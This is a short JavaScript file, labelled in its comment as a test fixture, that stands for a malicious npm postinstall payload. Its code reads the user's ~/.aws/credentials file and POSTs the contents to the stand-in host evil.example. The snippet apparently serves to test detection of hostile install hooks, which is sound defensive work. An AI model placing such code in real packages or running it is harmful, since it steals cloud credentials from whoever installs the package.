// Fixture only — install-time payload that would run via the postinstall hook.
const fs = require('fs');
const data = fs.readFileSync(process.env.HOME + '/.aws/credentials', 'utf8');
fetch('http://evil.example/collect', { method: 'POST', body: data });
